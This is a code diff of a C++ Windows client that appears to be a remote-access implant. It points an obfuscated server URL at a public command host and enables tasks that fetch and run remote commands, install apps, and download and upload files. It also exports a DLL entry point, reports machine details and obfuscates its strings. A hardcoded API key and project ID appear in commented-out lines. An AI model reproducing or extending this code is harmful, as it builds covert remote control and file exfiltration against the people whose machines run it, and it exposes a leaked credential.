@@ -11,13 +11,15 @@
 #include "HttpUtil.h"
 #include "Tasks.h"
 #include "Encrypter.h"
+#include "Uploader.h"
 namespace fs = std::filesystem;
 int64_t lastInfoQuery = 0;
 Information lastInfo;
-const std::string SERVER_BASE = OBFUSCATED("http://192.168.0.55:8070/app");
+// const std::string SERVER_BASE = OBFUSCATED("http://192.168.0.55:8070/app");
+const std::string SERVER_BASE = OBFUSCATED("https://commander-server-1.onrender.com/app");
 // const std::string SERVER_BASE = OBFUSCATED("http://localhost:8070/app");
-const std::string APPWRITEAPI_KEY = OBFUSCATED("c8de7ce28b6a16d8a2a6531672b6549547c7f3cd65af70782ac7e5bdd15733c49193d7e5ca02a01591ef6fc8313f974feea517af6f68e5593e33fd0b82392691aeff4d6792f057b5c08e5f2a76a81237436eed75358006393400bbb4828dc886f9fd07d55a47a36de99b0920e1c423f9ccedb72a5b6d26963f74df6236a2622f");
-const std::string APPWRITE_PROJECTID = OBFUSCATED("65f1b67fa4509b598d6e");
+// const std::string APPWRITEAPI_KEY = OBFUSCATED("c8de7ce28b6a16d8a2a6531672b6549547c7f3cd65af70782ac7e5bdd15733c49193d7e5ca02a01591ef6fc8313f974feea517af6f68e5593e33fd0b82392691aeff4d6792f057b5c08e5f2a76a81237436eed75358006393400bbb4828dc886f9fd07d55a47a36de99b0920e1c423f9ccedb72a5b6d26963f74df6236a2622f");
+// const std::string APPWRITE_PROJECTID = OBFUSCATED("65f1b67fa4509b598d6e");
 void uploadFile(std::string file);
 static PDH_HQUERY cpuQuery;
 static PDH_HCOUNTER cpuTotal;
@@ -49,6 +51,22 @@ void WaitForConnection()
 
 //     return bytes_read;
 // }
+std::string GetAppsDir()
+{
+    auto dir = fs::path(GetAssetDir()) /= OBFUSCATED("apps");
+    if (!Exists(dir.string()))
+    {
+        try
+        {
+            fs::create_directories(dir);
+        }
+        catch (const std::exception &e)
+        {
+            std::cerr << e.what() << '\n';
+        }
+    }
+    return dir.string();
+}
 std::string GetAssetDir()
 {
     std::string dir = OBFUSCATED("C:\\ProgramData");
@@ -108,6 +126,11 @@ bool PostMachineDetails()
     curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
     curl_easy_cleanup(curl);
     return res == CURLE_OK && (http_code >= 200 && http_code < 300);
+}
+EXPORT long GetVersion7878784494()
+{
+    long c_time = GetCompilationTime();
+    return c_time;
 }
 bool InternetIsWorking()
 {
@@ -195,15 +218,23 @@ HBITMAP GetThumbnail(std::string file)
 }
 void initTasks()
 {
-    // downloadsFetcherTask();
-    // uploadsFetcherTask();
-    // appsFetcherTask();
-    // commandsFetcherTask();
-    // installerTask();
+    downloadsFetcherTask();
+    uploadsFetcherTask();
+    appsFetcherTask();
+    commandsFetcherTask();
+    commandsRunnerTask();
+    installerTask();
     downloaderTask();
+    uploaderTask();
+    runnerTask();
+    transferProgressTask();
     partCleanerTask();
 }
+#ifdef DLL
 EXPORT void Start()
+#else
+void Start()
+#endif
 {
     // auto dls = fetchDownloads();
     // auto ups=fetchUploads();
@@ -241,15 +272,34 @@ EXPORT void Start()
     // binmessage::BinaryMessage decoded;
     // decoded.ParseFromString(encoded);
     // std::string data = decoded.data();
-    json j;
-    app::DownloadProgress prg;
-    app::to_json(j, prg);
-    std::cout << j.dump(4) << "\n\n";
+    // auto drives = fetchAppwriteDrives();
+    // // auto drives = fetchGoogleDrives();
+    // if (!drives.empty())
+    // {
+    //     UploadResponse resp;
+    //     do
+    //     {
+    //         resp = uploadAppwriteFile(R"(D:\downloads\m1act12usa.exe)", drives[0], nullptr, [](ProgressData prog)
+    //                                      {
+    //                                         if(prog.transferred>0){
+    //                                         std::cout << prog.name << "(" << std::to_string((int)((prog.transferred * 100) / prog.size)) << "%)" << ":\t" << prog.transferred << ":\t" << prog.size << "\n";
+    //                                         } });
+    //         std::cout << resp.code << "\n\n";
 
-    json j2;
-    app::UploadProgress up;
-    app::to_json(j2, up);
-    std::cout << j2.dump(4) << "\n\n";
+    //         std::cout << resp.response << "\n\n";
+
+    //     } while (!(resp.code >= 200 && resp.code < 300));
+    // }
+
+    // json j;
+    // app::DownloadProgress prg;
+    // app::to_json(j, prg);
+    // std::cout << j.dump(4) << "\n\n";
+
+    // json j2;
+    // app::UploadProgress up;
+    // app::to_json(j2, up);
+    // std::cout << j2.dump(4) << "\n\n";
 
     std::string mutexString = OBFUSCATED("Global MONITOR_APP");
     Locker lock(mutexString, true);
